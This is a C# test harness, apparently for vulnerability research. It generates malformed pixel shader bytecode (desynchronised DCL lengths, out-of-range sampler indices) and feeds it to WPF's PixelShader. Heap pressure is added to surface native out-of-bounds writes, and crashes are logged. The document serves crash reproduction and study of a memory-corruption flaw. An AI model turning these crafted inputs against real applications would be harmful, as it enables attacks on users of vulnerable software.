using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Effects;
using System.Windows.Media.Imaging;
using System.Windows.Threading;

namespace WpfShaderGate;

internal static class Program
{
    private const uint Ps20Version = 0xFFFF0200;
    private const uint DclOpcode = 0x0000001F;
    private const uint EndOpcode = 0x0000FFFF;
    private const uint ParameterToken = 0x80000000;
    private const uint Dcl2D = ParameterToken | (2u << 27);
    private const int SamplerRegisterType = 10;

    private static int _invalidShaderEvents;

    [STAThread]
    private static int Main(string[] args)
    {
        string caseName = args.Length > 0 ? args[0] : "end_only";
        int iterations = args.Length > 1 && int.TryParse(args[1], out var parsed)
            ? Math.Clamp(parsed, 1, 100)
            : 3;
        string outputPath = args.Length > 2
            ? Path.GetFullPath(args[2])
            : Path.GetFullPath($"result-{caseName}.json");
        string logPath = Path.ChangeExtension(outputPath, ".log");

        Directory.CreateDirectory(Path.GetDirectoryName(outputPath)!);

        void Log(string message)
        {
            string line = $"[{DateTimeOffset.UtcNow:O}] {message}";
            Console.WriteLine(line);
            File.AppendAllText(logPath, line + Environment.NewLine);
        }

        var result = new GateResult
        {
            Schema = 1,
            CaseName = caseName,
            IterationsRequested = iterations,
            ProcessId = Environment.ProcessId,
            OsDescription = RuntimeInformation.OSDescription,
            ProcessArchitecture = RuntimeInformation.ProcessArchitecture.ToString(),
            FrameworkDescription = RuntimeInformation.FrameworkDescription,
            PresentationCoreAssembly = typeof(PixelShader).Assembly.FullName,
            PresentationCorePath = typeof(PixelShader).Assembly.Location,
        };

        AppDomain.CurrentDomain.UnhandledException += (_, eventArgs) =>
        {
            Log($"UNHANDLED terminating={eventArgs.IsTerminating} value={eventArgs.ExceptionObject}");
        };

        PixelShader.InvalidPixelShaderEncountered += (_, _) =>
        {
            int count = Interlocked.Increment(ref _invalidShaderEvents);
            Log($"InvalidPixelShaderEncountered count={count}");
        };

        try
        {
            if (!string.IsNullOrWhiteSpace(result.PresentationCorePath) && File.Exists(result.PresentationCorePath))
            {
                result.PresentationCoreSha256 = Convert.ToHexString(
                    SHA256.HashData(File.ReadAllBytes(result.PresentationCorePath))).ToLowerInvariant();
            }

            RenderOptions.ProcessRenderMode = RenderMode.SoftwareOnly;
            Log($"START case={caseName} iterations={iterations}");
            Log($"runtime={result.FrameworkDescription}");
            Log($"presentation_core={result.PresentationCoreAssembly}");
            Log($"presentation_core_sha256={result.PresentationCoreSha256}");

            byte[] payload = BuildPayload(caseName, out var model);
            result.PayloadBytes = payload.Length;
            result.PayloadSha256 = Convert.ToHexString(SHA256.HashData(payload)).ToLowerInvariant();
            result.Model = model;
            Log($"payload_bytes={payload.Length} payload_sha256={result.PayloadSha256}");
            Log($"model={JsonSerializer.Serialize(model)}");

            bool managedExceptionObserved = false;
            for (int iteration = 1; iteration <= iterations; iteration++)
            {
                Log($"ITERATION_BEGIN {iteration}");
                try
                {
                    ExerciseShader(payload, iteration, Log);
                    result.IterationsCompleted++;
                    Log($"ITERATION_RETURNED {iteration}");
                }
                catch (Exception ex)
                {
                    managedExceptionObserved = true;
                    result.ManagedExceptions.Add(new ManagedExceptionRecord
                    {
                        Iteration = iteration,
                        Type = ex.GetType().FullName ?? ex.GetType().Name,
                        Message = ex.Message,
                        StackTrace = ex.StackTrace,
                    });
                    Log($"MANAGED_EXCEPTION iteration={iteration} type={ex.GetType().FullName} message={ex.Message}");
                }

                ForceHeapTurnover();
            }

            result.InvalidShaderEvents = Volatile.Read(ref _invalidShaderEvents);
            result.CompletedNormally = true;
            result.ManagedExceptionObserved = managedExceptionObserved;
            result.EndUtc = DateTimeOffset.UtcNow;
            File.WriteAllText(outputPath, JsonSerializer.Serialize(result, JsonOptions));
            Log($"END completed={result.IterationsCompleted}/{iterations} invalid_events={result.InvalidShaderEvents} managed_exception={managedExceptionObserved}");

            if (managedExceptionObserved)
            {
                return 43;
            }

            return result.InvalidShaderEvents > 0 ? 42 : 0;
        }
        catch (Exception ex)
        {
            result.FatalManagedException = new ManagedExceptionRecord
            {
                Iteration = 0,
                Type = ex.GetType().FullName ?? ex.GetType().Name,
                Message = ex.Message,
                StackTrace = ex.StackTrace,
            };
            result.EndUtc = DateTimeOffset.UtcNow;
            try
            {
                File.WriteAllText(outputPath, JsonSerializer.Serialize(result, JsonOptions));
                Log($"FATAL_MANAGED_EXCEPTION type={ex.GetType().FullName} message={ex.Message}");
            }
            catch
            {
                // Preserve the original error and process exit code.
            }
            return 44;
        }
    }

    private static readonly JsonSerializerOptions JsonOptions = new()
    {
        WriteIndented = true,
    };

    private static void ExerciseShader(byte[] payload, int iteration, Action<string> log)
    {
        // Make an out-of-bounds native write more likely to hit a guarded boundary under full page heap.
        var pressure = new List<byte[]>(64);
        for (int i = 0; i < 64; i++)
        {
            var block = GC.AllocateUninitializedArray<byte>(32 * 1024 + ((i + iteration) & 0x3FF));
            block[0] = (byte)i;
            block[^1] = (byte)(i ^ iteration);
            pressure.Add(block);
        }

        var shader = new PixelShader
        {
            ShaderRenderMode = ShaderRenderMode.SoftwareOnly,
        };

        using (var stream = new MemoryStream(payload, writable: false))
        {
            shader.SetStreamSource(stream);
        }
        log("SetStreamSource returned");

        var effect = new GateEffect(shader);
        var border = new Border
        {
            Width = 320,
            Height = 240,
            Background = Brushes.CornflowerBlue,
            Effect = effect,
            Child = new TextBlock
            {
                Text = $"WPF local gate {iteration}",
                FontSize = 20,
                Foreground = Brushes.White,
            },
        };

        border.Measure(new Size(320, 240));
        border.Arrange(new Rect(0, 0, 320, 240));
        border.UpdateLayout();

        var bitmap = new RenderTargetBitmap(320, 240, 96, 96, PixelFormats.Pbgra32);
        log("Render begin");
        bitmap.Render(border);
        Dispatcher.CurrentDispatcher.Invoke(() => { }, DispatcherPriority.ApplicationIdle);
        Thread.Sleep(400);
        log("Render returned");

        GC.KeepAlive(pressure);
        GC.KeepAlive(effect);
        GC.KeepAlive(shader);
        GC.KeepAlive(bitmap);
    }

    private static void ForceHeapTurnover()
    {
        for (int i = 0; i < 16; i++)
        {
            var bytes = new byte[128 * 1024 + i * 17];
            bytes[0] = (byte)i;
            bytes[^1] = (byte)(255 - i);
        }

        GC.Collect(2, GCCollectionMode.Forced, blocking: true, compacting: true);
        GC.WaitForPendingFinalizers();
        GC.Collect(2, GCCollectionMode.Forced, blocking: true, compacting: true);
    }

    private static byte[] BuildPayload(string caseName, out PayloadModel model)
    {
        var tokens = new List<uint> { Ps20Version };
        model = new PayloadModel { CaseName = caseName };

        if (string.Equals(caseName, "end_only", StringComparison.OrdinalIgnoreCase))
        {
            tokens.Add(EndOpcode);
            model.Kind = "control_end_only";
            return ToBytes(tokens, model);
        }

        if (caseName.StartsWith("dcl_desync_", StringComparison.OrdinalIgnoreCase))
        {
            int groups = ParseTrailingInteger(caseName, defaultValue: 64, maximum: 87300);
            model.Kind = "dcl_length_desynchronization";
            model.Groups = groups;
            model.FirstPassModelSlots = groups + 1L;
            model.SecondPassModelRecords = 2L * groups + 1L;
            model.ExcessModelRecords = groups;

            for (int i = 0; i < groups; i++)
            {
                tokens.Add(MakeInstructionToken(DclOpcode, parameterCount: 2));
                tokens.Add(0u);
                tokens.Add(0u);
            }
            tokens.Add(EndOpcode);
            return ToBytes(tokens, model);
        }

        if (caseName.StartsWith("sampler_s", StringComparison.OrdinalIgnoreCase))
        {
            int sampler = ParseIntegerAfter(caseName, "sampler_s", defaultValue: 16, maximum: 2047);
            int repeat = caseName.Contains("_repeat_", StringComparison.OrdinalIgnoreCase)
                ? ParseTrailingInteger(caseName, defaultValue: 64, maximum: 4096)
                : 1;
            bool invalidDeclType = caseName.Contains("_decltype0", StringComparison.OrdinalIgnoreCase);

            model.Kind = "sampler_dcl_direct_index";
            model.SamplerIndex = sampler;
            model.Groups = repeat;
            model.DeclarationTypeToken = invalidDeclType ? ParameterToken : Dcl2D;

            for (int i = 0; i < repeat; i++)
            {
                tokens.Add(MakeInstructionToken(DclOpcode, parameterCount: 2));
                tokens.Add(model.DeclarationTypeToken.Value);
                tokens.Add(MakeDestinationToken(SamplerRegisterType, sampler));
            }
            tokens.Add(EndOpcode);
            return ToBytes(tokens, model);
        }

        if (caseName.StartsWith("dcl_length_", StringComparison.OrdinalIgnoreCase))
        {
            int length = ParseTrailingInteger(caseName, defaultValue: 0, maximum: 15);
            model.Kind = "dcl_arbitrary_length";
            model.InstructionParameterCount = length;
            tokens.Add(MakeInstructionToken(DclOpcode, length));
            for (int i = 0; i < length; i++)
            {
                tokens.Add(0u);
            }
            tokens.Add(EndOpcode);
            return ToBytes(tokens, model);
        }

        throw new ArgumentException($"Unknown case name: {caseName}", nameof(caseName));
    }

    private static byte[] ToBytes(List<uint> tokens, PayloadModel model)
    {
        model.TokenCount = tokens.Count;
        byte[] payload = new byte[tokens.Count * sizeof(uint)];
        for (int i = 0; i < tokens.Count; i++)
        {
            BitConverter.TryWriteBytes(payload.AsSpan(i * sizeof(uint), sizeof(uint)), tokens[i]);
        }
        return payload;
    }

    private static uint MakeInstructionToken(uint opcode, int parameterCount)
        => opcode | ((uint)(parameterCount & 0x0F) << 24);

    private static uint MakeDestinationToken(int registerType, int registerIndex)
    {
        uint token = ParameterToken;
        token |= (uint)registerIndex & 0x7FFu;
        token |= ((uint)registerType & 0x7u) << 28;
        token |= ((uint)registerType & 0x18u) << 8;
        token |= 0x000F0000u; // all destination write-mask components
        return token;
    }

    private static int ParseTrailingInteger(string value, int defaultValue, int maximum)
    {
        int separator = value.LastIndexOf('_');
        return separator >= 0 && int.TryParse(value[(separator + 1)..], out int parsed)
            ? Math.Clamp(parsed, 0, maximum)
            : defaultValue;
    }

    private static int ParseIntegerAfter(string value, string prefix, int defaultValue, int maximum)
    {
        int start = value.IndexOf(prefix, StringComparison.OrdinalIgnoreCase);
        if (start < 0)
        {
            return defaultValue;
        }
        start += prefix.Length;
        int end = start;
        while (end < value.Length && char.IsDigit(value[end]))
        {
            end++;
        }
        return end > start && int.TryParse(value[start..end], out int parsed)
            ? Math.Clamp(parsed, 0, maximum)
            : defaultValue;
    }
}

public sealed class GateEffect : ShaderEffect
{
    public static readonly DependencyProperty InputProperty =
        RegisterPixelShaderSamplerProperty(nameof(Input), typeof(GateEffect), 0);

    public GateEffect(PixelShader pixelShader)
    {
        PixelShader = pixelShader;
        UpdateShaderValue(InputProperty);
    }

    public Brush Input
    {
        get => (Brush)GetValue(InputProperty);
        set => SetValue(InputProperty, value);
    }
}

internal sealed class GateResult
{
    public int Schema { get; set; }
    public string CaseName { get; set; } = string.Empty;
    public int IterationsRequested { get; set; }
    public int IterationsCompleted { get; set; }
    public int InvalidShaderEvents { get; set; }
    public bool ManagedExceptionObserved { get; set; }
    public bool CompletedNormally { get; set; }
    public int ProcessId { get; set; }
    public string OsDescription { get; set; } = string.Empty;
    public string ProcessArchitecture { get; set; } = string.Empty;
    public string FrameworkDescription { get; set; } = string.Empty;
    public string? PresentationCoreAssembly { get; set; }
    public string? PresentationCorePath { get; set; }
    public string? PresentationCoreSha256 { get; set; }
    public int PayloadBytes { get; set; }
    public string? PayloadSha256 { get; set; }
    public PayloadModel? Model { get; set; }
    public List<ManagedExceptionRecord> ManagedExceptions { get; set; } = [];
    public ManagedExceptionRecord? FatalManagedException { get; set; }
    public DateTimeOffset EndUtc { get; set; }
}

internal sealed class PayloadModel
{
    public string CaseName { get; set; } = string.Empty;
    public string Kind { get; set; } = string.Empty;
    public int TokenCount { get; set; }
    public int? Groups { get; set; }
    public int? SamplerIndex { get; set; }
    public int? InstructionParameterCount { get; set; }
    public uint? DeclarationTypeToken { get; set; }
    public long? FirstPassModelSlots { get; set; }
    public long? SecondPassModelRecords { get; set; }
    public long? ExcessModelRecords { get; set; }
}

internal sealed class ManagedExceptionRecord
{
    public int Iteration { get; set; }
    public string Type { get; set; } = string.Empty;
    public string Message { get; set; } = string.Empty;
    public string? StackTrace { get; set; }
}
